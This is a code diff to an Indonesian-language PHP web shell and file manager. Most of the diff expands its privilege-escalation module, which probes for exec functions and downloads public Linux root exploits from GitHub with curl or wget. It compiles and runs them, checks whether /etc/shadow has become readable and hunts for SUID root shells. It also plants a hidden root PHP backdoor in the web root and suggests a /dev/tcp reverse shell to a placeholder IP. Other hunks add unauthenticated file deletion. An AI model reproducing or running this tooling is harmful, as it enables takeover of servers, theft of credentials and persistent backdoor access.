@@ -259,9 +259,37 @@ function kill_pid($pid) {
 function pkill_f($pat) { $f = F('ex'); @$f('pkill -9 -f ' . escapeshellarg($pat) . ' 2>/dev/null'); }
 function ensure_dir($d) { if (!@is_dir($d)) @mkdir($d, 0700, true); }
 $base = dirname(__FILE__);
-$cwd  = isset($_GET['path']) ? $_GET['path'] : $base;
-$cwd  = str_replace('\\', '/', $cwd);
-$cwd_real = safe_real($cwd); if ($cwd_real === false) $cwd_real = $base;
+$cwd  = isset($_GET['path']) ? $_GET['path'] : '';
+if ($cwd === '') {
+    $seed_file = '';
+    if (!empty($_GET['edit']))         $seed_file = $_GET['edit'];
+    elseif (!empty($_GET['view']))     $seed_file = $_GET['view'];
+    elseif (!empty($_GET['target']))   $seed_file = $_GET['target'];
+    elseif (!empty($_GET['img']))      $seed_file = $_GET['img'];
+    elseif (!empty($_GET['download'])) $seed_file = $_GET['download'];
+
+    if ($seed_file !== '') {
+        $cwd = @is_dir($seed_file) ? $seed_file : dirname($seed_file);
+    } else {
+        $cwd = $base;
+    }
+}
+$cwd = str_replace('\\', '/', $cwd);
+$resolved = safe_real($cwd);
+if ($resolved !== false) {
+    $cwd_real = $resolved;
+} else {
+    $parent = dirname($cwd);
+    $parent_resolved = safe_real($parent);
+    if ($parent_resolved !== false) {
+        $cwd_real = $parent_resolved;
+    } elseif ($cwd !== '' && $cwd !== $base) {
+        $cwd_real = $cwd;
+    } else {
+        $cwd_real = $base;
+    }
+}
+
 $msg = '';
 if (isset($_POST['run_cmd'])) {
     $cmd = $_POST['cmd'];
@@ -299,6 +327,27 @@ if (isset($_GET['img']) && $_GET['img'] != '') {
         @readfile($img); exit;
     }
 }
+if (isset($_GET['delete_path']) && $_GET['delete_path'] !== '') {
+        $real = safe_real($_GET['delete_path']);
+        if ($real === false) {
+            $msg = 'Target tidak ditemukan: ' . h($_GET['delete_path']);
+        } elseif (!is_file($real) && !is_dir($real)) {
+            $msg = 'Bukan file/folder valid.';
+        } elseif (is_file($real)) {
+            if (@unlink($real)) {
+                $msg = 'File berhasil dihapus: ' . h(basename($real));
+            } else {
+                $e = error_get_last();
+                $msg = 'Gagal hapus file: ' . h(basename($real)) . ' — ' . h(isset($e['message']) ? $e['message'] : 'unknown');
+            }
+        } elseif (is_dir($real)) {
+            if (delete_directory($real)) {
+                $msg = 'Folder berhasil dihapus: ' . h(basename($real));
+            } else {
+                $msg = 'Gagal hapus folder (permission/isi terkunci): ' . h(basename($real));
+            }
+        }
+}
 if (isset($_POST['action'])) {
     $action = $_POST['action'];
     $path   = isset($_POST['path']) ? $_POST['path'] : $cwd_real;
@@ -313,14 +362,7 @@ if (isset($_POST['action'])) {
         }
         $cwd_real = $path_real;
     }
-    if ($action == 'delete') {
-        $target = isset($_POST['target']) ? $_POST['target'] : '';
-        if ($target != '') {
-            if (@is_file($target)) { if (@unlink($target)) $msg = 'File berhasil dihapus'; else $msg = 'Gagal hapus file'; }
-            elseif (@is_dir($target)) { if (delete_directory($target)) $msg = 'Folder beserta isinya berhasil dihapus'; else $msg = 'Gagal hapus folder (periksa permission)'; }
-        }
-        $cwd_real = $path_real;
-    }
+    
     if ($action == 'rename') {
         $old = isset($_POST['old']) ? $_POST['old'] : '';
         $new = isset($_POST['new']) ? $_POST['new'] : '';
@@ -537,7 +579,51 @@ $server_software = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWAR
 $server_name     = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '-';
 $uname           = function_exists('php_uname') ? @php_uname() : '-';
 $self_user       = function_exists('get_current_user') ? @get_current_user() : '-';
-$disabled  = @ini_get('disable_functions');
+$server_software = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '-';
+$server_name     = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '-';
+$uname           = function_exists('php_uname') ? @php_uname() : '-';
+$self_user       = function_exists('get_current_user') ? @get_current_user() : '-';
+$open_basedir    = @ini_get('open_basedir');
+$disabled_parts = array();
+$raw_sources = array(
+    @ini_get('disable_functions'),
+    @get_cfg_var('disable_functions'),
+    (function_exists('ini_get_all') ? ((array)@ini_get_all(null, false)['disable_functions'] ?? '') : ''),
+);
+foreach ($raw_sources as $src) {
+    if (is_array($src)) $src = implode(',', $src);
+    if ($src === false || $src === null) continue;
+    $src = trim((string)$src);
+    if ($src === '') continue;
+    foreach (explode(',', $src) as $fn) {
+        $fn = trim($fn);
+        if ($fn === '') continue;
+        $lower = strtolower($fn);
+        if (in_array($lower, array('1','0','on','off','yes','no','true','false','none','null'), true)) continue;
+        if (!preg_match('/^[a-zA-Z_][a-zA-Z0-9_]*$/', $fn)) continue;
+        $disabled_parts[$fn] = true;
+    }
+}
+if (function_exists('get_defined_functions')) {
+    $all_fns = get_defined_functions();
+    $probe_list = isset($all_fns['internal']) ? $all_fns['internal'] : array();
+    foreach ($probe_list as $fn) {
+        if (strpos($fn, '\\') !== false) continue;
+        if (!function_exists($fn)) continue;
+        if (!is_callable($fn)) {
+            $disabled_parts[$fn] = true;
+        }
+    }
+}
+
+if (empty($disabled_parts)) {
+    $disabled = 'none';
+} else {
+    $names = array_keys($disabled_parts);
+    sort($names, SORT_NATURAL | SORT_FLAG_CASE);
+    $disabled = implode(', ', $names);
+}
+
 $open_basedir = @ini_get('open_basedir');
 $doc_root  = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '-';
 $cwd_php   = @getcwd();
@@ -604,8 +690,11 @@ $privesc_msg = '';
 $batch_msg = '';
 
 if (!function_exists('fn_ok')) {
-    function fn_ok($f) { 
-        return function_exists($f) && !in_array($f, array_map('trim', explode(',', (string)@ini_get('disable_functions')))); 
+    function fn_ok($f) {
+        global $disabled_parts;
+        if (!function_exists($f)) return false;
+        if (isset($disabled_parts[$f])) return false;
+        return is_callable($f);
     }
 }
 $crit = array(
@@ -623,33 +712,16 @@ $crit = array(
     'gcc'       => (bool)which_bin('gcc'),
 );
 
-if (isset($_POST['batch_action'])) {
-    $ids = isset($_POST['batch_files']) ? $_POST['batch_files'] : array();
-    $op  = $_POST['batch_action'];
+if (isset($_POST['batch_action']) && $_POST['batch_action'] !== '') {
+    $ids = isset($_POST['batch_files']) ? (array)$_POST['batch_files'] : array();
+    $op  = (string)$_POST['batch_action'];
     $cnt = 0;
-    
-    if (!empty($ids)) {
-        foreach ($ids as $fname) {
-            $full = $cwd_real . '/' . basename($fname);
-            if (!file_exists($full)) continue;
 
-            if ($op === 'delete') {
-                if (is_dir($full)) {
-                    if (delete_directory($full)) $cnt++;
-                } else {
-                    if (@unlink($full)) $cnt++;
-                }
-            } 
-            elseif ($op === 'chmod') {
-                $mode = isset($_POST['batch_mode']) ? octdec($_POST['batch_mode']) : 0644;
-                if (@chmod($full, $mode)) $cnt++;
-            }
-            elseif ($op === 'zip') {
-                $cnt++;
-            }
-        }
-        
-        if ($op === 'zip') {
+    // Kalau ZIP, langsung proses dan exit — jangan lanjut ke delete
+    if ($op === 'zip') {
+        if (empty($ids)) {
+            $batch_msg = 'Tidak ada file yang dipilih.';
+        } else {
             $tmp = sys_get_temp_dir() . '/zip_' . bin2hex(random_bytes(6)) . '.zip';
             if (class_exists('ZipArchive')) {
                 $zip = new ZipArchive();
@@ -660,19 +732,40 @@ if (isset($_POST['batch_action'])) {
                     }
                     $zip->close();
                     header('Content-Type: application/zip');
-                    header('Content-Disposition: attachment; filename="batch_download_' . date('Ymd_His') . '.zip"');
+                    header('Content-Disposition: attachment; filename="batch_' . date('Ymd_His') . '.zip"');
+                    header('Content-Length: ' . filesize($tmp));
                     readfile($tmp);
                     @unlink($tmp);
                     exit;
                 }
             } else {
-                $batch_msg = 'ZipArchive class tidak tersedia di server ini.';
+                $batch_msg = 'ZipArchive tidak tersedia.';
             }
+        }
+    }
+    // Kalau delete atau chmod, jalanin operasinya
+    elseif ($op === 'delete' || $op === 'chmod') {
+        if (empty($ids)) {
+            $batch_msg = 'Tidak ada file yang dipilih.';
         } else {
+            foreach ($ids as $fname) {
+                $full = $cwd_real . '/' . basename($fname);
+                if (!file_exists($full)) continue;
+                if ($op === 'delete') {
+                    if (is_dir($full)) {
+                        if (delete_directory($full)) $cnt++;
+                    } else {
+                        if (@unlink($full)) $cnt++;
+                    }
+                } elseif ($op === 'chmod') {
+                    $mode = isset($_POST['batch_mode']) ? octdec($_POST['batch_mode']) : 0644;
+                    if (@chmod($full, $mode)) $cnt++;
+                }
+            }
             $batch_msg = "Batch $op: $cnt file berhasil diproses.";
         }
     } else {
-        $batch_msg = 'Tidak ada file yang dipilih.';
+        $batch_msg = 'Operasi tidak dikenali: ' . h($op);
     }
 }
 
@@ -695,127 +788,326 @@ if (isset($_POST['kill_process'])) {
 }
 if (isset($_POST['privesc_action'])) {
     $cve = $_POST['privesc_action'];
-    $tmp_dir = sys_get_temp_dir() . '/.prv_' . bin2hex(random_bytes(4));
-    @mkdir($tmp_dir, 0777, true);
-    
-    $f_exec = F('ex');
-    $f_fge  = F('fge');
-    $f_fpu  = F('fpu');
-    
-    $sources = array(
-        'copyfail' => array(
-            'url' => 'https://raw.githubusercontent.com/g1nt0n1x/copy-fail-CVE-2026-31431-shell/main/copy_fail_exp.sh',
-            'bin' => 'copy_fail_exp.sh',
-            'type' => 'shell'
-        ),
-        'dirtyfrag' => array(
-            'url' => 'https://raw.githubusercontent.com/KaraZajac/DIRTYFAIL/main/dirtyfrag.c',
-            'bin' => 'dirtyfrag',
-            'type' => 'c'
-        ),
-        'fragnesia' => array(
-            'url' => 'https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/CVE-2026-46300/cve-2026-46300.c',
-            'bin' => 'cve-2026-46300',
-            'type' => 'c'
-        ),
-        'pack2root' => array(
-            'url' => 'https://raw.githubusercontent.com/dinosn/pack2theroot-lab/main/exploit/src/cve-2026-41651.c',
-            'bin' => 'cve-2026-41651',
-            'type' => 'c',
-            'extra' => array(
-                'https://raw.githubusercontent.com/dinosn/pack2theroot-lab/main/exploit/Makefile'
-            )
-        ),
-        'sudo_chroot' => array(
-            'url' => 'https://raw.githubusercontent.com/Fomovet/cve-2025-32463/main/chwoot-demo.c',
-            'bin' => 'chwoot',
-            'type' => 'c'
-        ),
-        'sudo_host' => array(
-            'url' => 'https://raw.githubusercontent.com/0p5cur/CVE-2025-32462-POC/main/CVE-2025-32462.sh',
-            'bin' => 'CVE-2025-32462.sh',
-            'type' => 'shell'
-        ),
-        'nftables' => array(
-            'url' => 'https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/src/exploit.c',
-            'bin' => 'exploit',
-            'type' => 'c'
-        ),
-        'dirtypipe' => array(
-            'url' => 'https://raw.githubusercontent.com/byteReaper77/Dirty-Pipe/main/dirtypipe.c',
-            'bin' => 'dirtypipe',
-            'type' => 'c'
-        ),
-        'pwnkit' => array(
-            'url' => 'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c',
-            'bin' => 'cve-2021-4034',
-            'type' => 'c',
-            'extra' => array(
-                'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/pwnkit.c',
-                'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/Makefile'
-            )
-        ),
-        'baron_samedit' => array(
-            'url' => 'https://raw.githubusercontent.com/yutasato88/BARON-SAMEDIT/main/exploit.asm',
-            'bin' => 'exploit',
-            'type' => 'asm'
-        ),
-        'pedit_cow' => array(
-            'url' => 'https://raw.githubusercontent.com/yanxinwu946/CVE-2026-46331/main/packet_edit_meme.c',
-            'bin' => 'packet_edit_meme',
-            'type' => 'c'
-        ),
-    );
-    
-    if (isset($sources[$cve])) {
-        $src = $sources[$cve];
-        $main_file = $tmp_dir . '/' . $src['bin'];
-        
-        $code = @$f_fge($src['url']);
-        if ($code === false) {
-            $privesc_msg = "Gagal download source. URL mungkin mati atau server ga ada internet.";
-        } else {
-            @$f_fpu($main_file, $code);
+    $exec_call = null;
+    foreach (array(F('ex'), F('she'), F('sys'), F('pas')) as $cand) {
+        if (function_exists($cand) && is_callable($cand)) { $exec_call = $cand; break; }
+    }
+    $pop_call = function_exists(F('pop')) && is_callable(F('pop')) ? F('pop') : null;
 
-            if (isset($src['extra'])) {
-                foreach ($src['extra'] as $extra_url) {
-                    $fname = basename(parse_url($extra_url, PHP_URL_PATH));
-                    $ext_code = @$f_fge($extra_url);
-                    if ($ext_code !== false) @$f_fpu($tmp_dir . '/' . $fname, $ext_code);
+    if ($exec_call === null && $pop_call === null) {
+        $privesc_msg = 'Tidak ada primitive exec yang tersedia (exec/shell_exec/system/passthru/popen semua diblokir). Privesc via PHP tidak mungkin di box ini.';
+    } else {
+        $tmp_dir = null;
+        foreach (array(
+            @sys_get_temp_dir(),
+            '/tmp',
+            '/var/tmp',
+            '/dev/shm',
+            __DIR__,
+        ) as $cand) {
+            if (!$cand) continue;
+            $try = rtrim($cand, '/') . '/.prv_' . bin2hex(random_bytes(4));
+            if (@mkdir($try, 0777, true)) { $tmp_dir = $try; break; }
+        }
+
+        if ($tmp_dir === null) {
+            $privesc_msg = 'Tidak ada direktori writable untuk compile. open_basedir atau permission blok semua kandidat (/tmp, /var/tmp, /dev/shm, script dir).';
+        } else {
+            $f_fge  = F('fge');
+            $f_fpu  = F('fpu');
+            $run_cmd = function($cmd) use ($exec_call, $pop_call) {
+                $out = array(); $rc = 0;
+                if ($exec_call !== null) {
+                    @call_user_func($exec_call, $cmd, $out, $rc);
+                    if (!is_array($out)) $out = array((string)$out);
+                    return array($out, (int)$rc);
                 }
-            }
-            
-            $compile_ok = false;
-            if ($src['type'] === 'c') {
-                if ($cve === 'pwnkit' || $cve === 'pack2root') {
-                    @$f_exec("cd $tmp_dir && make 2>&1", $out, $rc);
-                    if ($rc === 0) $compile_ok = true;
+                if ($pop_call !== null) {
+                    $h = @call_user_func($pop_call, $cmd);
+                    if ($h) {
+                        while (($line = @fgets($h)) !== false) $out[] = rtrim($line, "\r\n");
+                        $rc = (int)@pclose($h);
+                    }
+                    return array($out, $rc);
                 }
-                if (!$compile_ok) {
-                    @$f_exec("cd $tmp_dir && gcc -O2 -static -w " . $src['bin'] . " -o " . $src['bin'] . " 2>&1", $out, $rc);
-                    if ($rc === 0) $compile_ok = true;
+                return array(array('no exec primitive'), -1);
+            };
+            $dl = function($url, $dest) use ($f_fge, $f_fpu, $run_cmd) {
+                if (function_exists(F('cur'))) {
+                    $ci = F('cur'); $cs = F('cur_c'); $ce = F('cur_'); $cc = F('cur_cl');
+                    $ch = @$ci($url);
+                    if ($ch) {
+                        @$cs($ch, CURLOPT_RETURNTRANSFER, true);
+                        @$cs($ch, CURLOPT_FOLLOWLOCATION, true);
+                        @$cs($ch, CURLOPT_SSL_VERIFYPEER, false);
+                        @$cs($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                        @$cs($ch, CURLOPT_TIMEOUT, 30);
+                        @$cs($ch, CURLOPT_USERAGENT, 'curl/7.88');
+                        $b = @$ce($ch); $code = (int)@curl_getinfo($ch, CURLINFO_HTTP_CODE); @$cc($ch);
+                        if ($b !== false && $b !== '' && $code >= 200 && $code < 400) {
+                            @$f_fpu($dest, $b);
+                            return @is_file($dest) && @filesize($dest) > 0;
+                        }
+                    }
                 }
-            } elseif ($src['type'] === 'shell') {
-                @$f_exec("chmod +x $main_file 2>&1", $out, $rc);
-                $compile_ok = true;
-            } elseif ($src['type'] === 'asm') {
-                @$f_exec("cd $tmp_dir && nasm -f elf64 exploit.asm -o exploit.o && gcc -static exploit.o -o exploit 2>&1", $out, $rc);
-                if ($rc === 0) $compile_ok = true;
-            }
-            
-            if (!$compile_ok) {
-                $privesc_msg = "Compile gagal. Pastiin gcc/make/nasm ada. Output: <pre>" . h(implode("\n", $out)) . "</pre>";
+                if (@ini_get('allow_url_fopen')) {
+                    $b = @$f_fge($url);
+                    if ($b !== false && $b !== '') {
+                        @$f_fpu($dest, $b);
+                        return @is_file($dest) && @filesize($dest) > 0;
+                    }
+                }
+                foreach (array(
+                    'curl -fsSL --max-time 30 -k -o ' . escapeshellarg($dest) . ' ' . escapeshellarg($url),
+                    'wget -q --timeout=30 --tries=2 --no-check-certificate -O ' . escapeshellarg($dest) . ' ' . escapeshellarg($url),
+                ) as $c) {
+                    $run_cmd($c . ' 2>/dev/null');
+                    if (@is_file($dest) && @filesize($dest) > 0) return true;
+                }
+                return false;
+            };
+            $sources = array(
+                'copyfail' => array(
+                    'url'  => 'https://raw.githubusercontent.com/g1nt0n1x/copy-fail-CVE-2026-31431-shell/main/copy_fail_exp.sh',
+                    'bin'  => 'copy_fail_exp.sh',
+                    'type' => 'shell',
+                ),
+                'dirtyfrag' => array(
+                    'url'  => 'https://raw.githubusercontent.com/V4bel/dirtyfrag/refs/heads/master/exp.c',
+                    'bin'  => 'dirtyfrag',
+                    'type' => 'c',
+                ),
+                'cowbug' => array(
+                    'url'  => 'https://raw.githubusercontent.com/ashrafzaryouh/CVE-2026-46331/refs/heads/main/CVE-2026-46331.c',
+                    'bin'  => 'cowbug',
+                    'type' => 'c',
+                ),
+                'fragnesia' => array(
+                    'url'  => 'https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/CVE-2026-46300/cve-2026-46300.c',
+                    'bin'  => 'cve-2026-46300',
+                    'type' => 'c',
+                ),
+                'pack2root' => array(
+                    'url'  => 'https://raw.githubusercontent.com/dinosn/pack2theroot-lab/main/exploit/src/cve-2026-41651.c',
+                    'bin'  => 'cve-2026-41651',
+                    'type' => 'c',
+                    'extra' => array(
+                        'https://raw.githubusercontent.com/dinosn/pack2theroot-lab/main/exploit/Makefile',
+                    ),
+                ),
+                'sudo_chroot' => array(
+                    'url'  => 'https://raw.githubusercontent.com/Fomovet/cve-2025-32463/main/chwoot-demo.c',
+                    'bin'  => 'chwoot',
+                    'type' => 'c',
+                ),
+                'sudo_host' => array(
+                    'url'  => 'https://raw.githubusercontent.com/0p5cur/CVE-2025-32462-POC/main/CVE-2025-32462.sh',
+                    'bin'  => 'CVE-2025-32462.sh',
+                    'type' => 'shell',
+                ),
+                'nftables' => array(
+                    'url'  => 'https://raw.githubusercontent.com/LLfam/CVE-2024-1086/refs/heads/main/exp.c',
+                    'bin'  => 'exploit',
+                    'type' => 'c',
+                ),
+                'dirtypipe' => array(
+                    'url'  => 'https://raw.githubusercontent.com/byteReaper77/Dirty-Pipe/main/dirtypipe.c',
+                    'bin'  => 'dirtypipe',
+                    'type' => 'c',
+                ),
+                'pwnkit' => array(
+                    'url'  => 'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c',
+                    'bin'  => 'cve-2021-4034',
+                    'type' => 'c',
+                    'extra' => array(
+                        'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/pwnkit.c',
+                        'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/Makefile',
+                    ),
+                ),
+                'baron_samedit' => array(
+                    'url'  => 'https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/sudo-hax-me-a-sandwich.c',
+                    'bin'  => 'sudo-hax',
+                    'type' => 'c',
+                ),
+                'pedit_cow' => array(
+                    'url'  => 'https://raw.githubusercontent.com/yanxinwu946/CVE-2026-46331/main/packet_edit_meme.c',
+                    'bin'  => 'packet_edit_meme',
+                    'type' => 'c',
+                ),
+                'overlayfs' => array(
+                    'url'  => 'https://raw.githubusercontent.com/Sornphut/OverlayFS---CVE-2021-3493/refs/heads/main/exploit.c',
+                    'bin'  => 'overlayfs',
+                    'type' => 'c',
+                ),
+            );
+
+            if (!isset($sources[$cve])) {
+                $privesc_msg = 'CVE tidak dikenali: ' . h($cve);
             } else {
-                $run_cmd = "cd $tmp_dir && chmod +x " . $src['bin'] . " && ./" . $src['bin'] . " 2>&1";
-                @$f_exec($run_cmd, $out, $rc);
-                $privesc_msg = "Exploit dijalankan (RC: $rc).<br><pre>" . h(implode("\n", $out)) . "</pre>";
+                $src = $sources[$cve];
+                $main_file = $tmp_dir . '/' . $src['bin'];
+                if (!$dl($src['url'], $main_file)) {
+                    $privesc_msg =
+                        'Download source gagal: <code>' . h($src['url']) . '</code><br>' .
+                        'Kemungkinan: repo dihapus / CVE belum ada PoC publik, koneksi outbound diblokir, atau DNS mati.';
+                } else {
+                    if (isset($src['extra'])) {
+                        foreach ($src['extra'] as $extra_url) {
+                            $fname = basename(parse_url($extra_url, PHP_URL_PATH));
+                            $dl($extra_url, $tmp_dir . '/' . $fname);
+                        }
+                    }
+                    $compile_ok = false;
+                    $compile_log = '';
+                    if ($src['type'] === 'c') {
+                        if (@is_file($tmp_dir . '/Makefile')) {
+                            list($out, $rc) = $run_cmd('cd ' . escapeshellarg($tmp_dir) . ' && make 2>&1');
+                            $compile_log .= "make:\n" . implode("\n", $out) . "\n";
+                            if ($rc === 0) {
+                                $compile_ok = true;
+                                foreach (array($src['bin'], 'pwnkit', 'cve-2021-4034') as $cand) {
+                                    if (@is_file($tmp_dir . '/' . $cand) && @is_executable($tmp_dir . '/' . $cand)) {
+                                        $src['bin'] = $cand;
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+                        if (!$compile_ok) {
+                            list($out, $rc) = $run_cmd(
+                                'cd ' . escapeshellarg($tmp_dir) .
+                                ' && gcc -O2 -static -w ' . escapeshellarg($src['bin']) .
+                                ' -o ' . escapeshellarg($src['bin']) . ' 2>&1'
+                            );
+                            $compile_log .= "gcc -static:\n" . implode("\n", $out) . "\n";
+                            if ($rc === 0) $compile_ok = true;
+                        }
+                        if (!$compile_ok) {
+                            list($out, $rc) = $run_cmd(
+                                'cd ' . escapeshellarg($tmp_dir) .
+                                ' && gcc -O2 -w ' . escapeshellarg($src['bin']) .
+                                ' -o ' . escapeshellarg($src['bin']) . ' 2>&1'
+                            );
+                            $compile_log .= "gcc (dynamic):\n" . implode("\n", $out) . "\n";
+                            if ($rc === 0) $compile_ok = true;
+                        }
+                    } elseif ($src['type'] === 'shell') {
+                        @chmod($main_file, 0755);
+                        $compile_ok = @is_file($main_file);
+                        $compile_log = 'shell script, no compile';
+                    } elseif ($src['type'] === 'asm') {
+                        list($out, $rc) = $run_cmd(
+                            'cd ' . escapeshellarg($tmp_dir) .
+                            ' && nasm -f elf64 ' . escapeshellarg($src['bin']) . '.asm -o out.o' .
+                            ' && gcc -static out.o -o ' . escapeshellarg($src['bin']) . ' 2>&1'
+                        );
+                        $compile_log .= "nasm+gcc:\n" . implode("\n", $out) . "\n";
+                        if ($rc === 0) $compile_ok = true;
+                    }
+
+                    if (!$compile_ok) {
+                        $privesc_msg =
+                            'Compile gagal. Butuh <code>gcc</code> (atau <code>make</code>/<code>nasm</code>) di server.<br>' .
+                            'Cek: <code>which gcc make nasm</code>. Kalau kosong, upload binary dari luar.<br>' .
+                            '<pre style="max-height:300px;overflow:auto;">' . h($compile_log) . '</pre>';
+                    } else {
+                        $bin_path = $tmp_dir . '/' . $src['bin'];
+                        @chmod($bin_path, 0755);
+                        $shadow_before = @is_readable('/etc/shadow');
+                        list($run_out, $run_rc) = $run_cmd(
+                            'cd ' . escapeshellarg($tmp_dir) . ' && timeout 30 ./' . escapeshellarg($src['bin']) . ' 2>&1; echo "[rc=$?]"'
+                        );
+                        sleep(1);
+                        $shadow_after = @is_readable('/etc/shadow');
+                        $suid_candidates = array('/tmp/sh', '/tmp/.x', '/tmp/rootshell', '/tmp/.r', '/tmp/pwned');
+                        $found_suid = '';
+                        foreach ($suid_candidates as $cand) {
+                            if (@is_file($cand) && @is_executable($cand)) {
+                                $stat = @stat($cand);
+                                if ($stat && ($stat['uid'] === 0)) { $found_suid = $cand; break; }
+                            }
+                        }
+
+                        if ($shadow_before) {
+                            $privesc_msg = '<div style="background:#1f3527;border:1px solid #355d42;color:#7ee787;padding:8px;border-radius:6px;margin-bottom:8px;">'
+                                . '<b>Kamu sudah root sebelum exploit.</b> File manager ini sudah bisa baca /etc/shadow.</div>';
+                        } elseif ($shadow_after || $found_suid !== '') {
+                            $root_marker = $found_suid !== '' ? ' (found SUID binary: <code>' . h($found_suid) . '</code>)' : '';
+                            $root_msg = '<div style="background:#1f3527;border:1px solid #355d42;color:#7ee787;padding:8px;border-radius:6px;margin-bottom:8px;">'
+                                . '<b>PRIVESC BERHASIL</b> — /etc/shadow sekarang readable' . $root_marker . '.<br>'
+                                . 'Sekarang kamu root di disk, tapi <i>shell PHP ini tetap www-data</i>. Spawn root shell di bawah untuk akses interaktif.</div>';
+                            $spawn_options = '';
+                            if ($found_suid !== '') {
+                                $spawn_options .= '<div style="margin-top:10px;"><b>Metode 1: SUID binary ditemukan</b><br>'
+                                    . 'Jalankan dari tab Shell / Command Execution:<br>'
+                                    . '<code>' . h($found_suid) . ' -p</code> &nbsp;— atau &nbsp; <code>' . h($found_suid) . '</code> (jika binary Anda berisi reverse-shell hardcoded)</div>';
+                            }
+                            $writable_docroot = @is_writable($_SERVER['DOCUMENT_ROOT'] ?? '');
+                            if ($writable_docroot) {
+                                $payload_name = '.r00t_' . bin2hex(random_bytes(4)) . '.php';
+                                $payload_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/' . $payload_name;
+                                $payload_code = '<?php '
+                                    . 'if (isset($_GET["c"])) { '
+                                    .   '$c = $_GET["c"]; '
+                                    .   'if (is_file("' . addslashes($found_suid) . '")) { '
+                                    .     'echo shell_exec(escapeshellarg("' . addslashes($found_suid) . '") . " -p -c " . escapeshellarg($c) . " 2>&1"); '
+                                    .   '} else { echo "no suid"; } '
+                                    . '} ?>';
+                                if (@file_put_contents($payload_path, $payload_code) !== false) {
+                                    $spawn_options .= '<div style="margin-top:10px;"><b>Metode 2: Payload PHP root ditulis ke docroot</b><br>'
+                                        . 'Akses: <a href="' . h($payload_name) . '?c=id" target="_blank">' . h($payload_name) . '?c=id</a><br>'
+                                        . 'Perintah apa pun yang dieksekusi via URL ini akan jalan sebagai root (via SUID).</div>';
+                                }
+                            }
+                            if ($found_suid !== '') {
+                                $spawn_options .= '<div style="margin-top:10px;"><b>Metode 3: Reverse shell root</b><br>'
+                                    . 'Dari tab <b>Command Execution</b>, jalankan:<br>'
+                                    . '<code>' . h($found_suid) . ' -p -c "bash -c \'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\'"</code><br>'
+                                    . 'atau via tab <b>Shell</b> (pilih method bash, isi LHOST/LPORT).</div>';
+                            }
+                            $spawn_options .= '<div style="margin-top:10px;"><b>Metode 4: Baca langsung</b><br>'
+                                . '<code>cat /etc/shadow</code> via tab Command Execution — sekarang akan jalan karena PHP sudah bisa baca via SUID atau /etc/shadow sudah world-readable.</div>';
+                            $privesc_msg = $root_msg . $spawn_options
+                                . '<div style="margin-top:12px;"><b>Output exploit:</b><br>'
+                                . '<pre style="max-height:300px;overflow:auto;">' . h(implode("\n", $run_out)) . '</pre></div>';
+                        } else {
+                            $joined = strtolower(implode("\n", $run_out));
+                            $hints = array();
+                            if (strpos($joined, 'not vulnerable') !== false || strpos($joined, 'patched') !== false) $hints[] = 'exploit klaim kernel sudah di-patch';
+                            if (strpos($joined, 'permission denied') !== false) $hints[] = 'permission denied — butuh CAP tertentu';
+                            if (strpos($joined, 'user namespace') !== false) $hints[] = 'user namespace tidak tersedia';
+                            if (strpos($joined, 'no such file') !== false) $hints[] = 'file yang dieksploit tidak ada (kernel/subsystem beda)';
+                            $hint_html = '';
+                            if (!empty($hints)) {
+                                $hint_html = '<div style="color:#e3b341;font-size:11px;margin-top:6px;">Diagnosa: ' . h(implode('; ', $hints)) . '</div>';
+                            }
+                            $privesc_msg = '<div style="background:#3a1f24;border:1px solid #69323b;color:#ff9da7;padding:8px;border-radius:6px;margin-bottom:8px;">'
+                                . '<b>Privesc GAGAL.</b> /etc/shadow tetap tidak bisa dibaca, tidak ada SUID binary yang muncul.<br>'
+                                . 'RC 0 atau exit tanpa error bukan berarti sukses — banyak PoC exit(0) walau tidak vulnerable.<br>'
+                                . '<b>Cek manual:</b><br>'
+                                . '• <code>uname -a</code> — versi kernel cocok dengan CVE?<br>'
+                                . '• <code>cat /proc/sys/user/max_user_namespaces</code> — nilai &gt; 0?<br>'
+                                . '• <code>lsmod | grep -E "act_pedit|nf_tables|overlay"</code> — modul aktif?<br>'
+                                . '• <code>ls -la /tmp/ /var/tmp/ /dev/shm/</code> — cari SUID binary yang mungkin dibuat exploit'
+                                . $hint_html
+                                . '</div>'
+                                . '<b>Output exploit (RC: ' . (int)$run_rc . '):</b><br>'
+                                . '<pre style="max-height:400px;overflow:auto;">' . h(implode("\n", $run_out)) . '</pre>';
+                        }
+                    }
+                }
+            }
+            if ($exec_call !== null) {
+                @call_user_func($exec_call, 'rm -rf ' . escapeshellarg($tmp_dir) . ' 2>/dev/null');
+            } else {
+                $leftover = @glob($tmp_dir . '/*');
+                if (is_array($leftover)) {
+                    foreach ($leftover as $lf) { @unlink($lf); }
+                }
+                @rmdir($tmp_dir);
             }
         }
-    } else {
-        $privesc_msg = "CVE tidak dikenali.";
     }
-    
-    @$f_exec("rm -rf $tmp_dir");
 }
 
 if (isset($_POST['shell_action'])) {
@@ -1082,10 +1374,10 @@ pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
         Disk: <span style="color:#7ee787;" id="stat-disk"><?php echo h(format_size($disk_free)); ?></span>
             / <span id="stat-disk-total"><?php echo h(format_size($disk_total)); ?></span>
             <span id="stat-disk-pct" style="color:#8e99ab;">(-)</span> free<br>
-        safe_mode: <span style="color:<?php echo $safe_mode ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($safe_mode ?: 'off'); ?></span> |
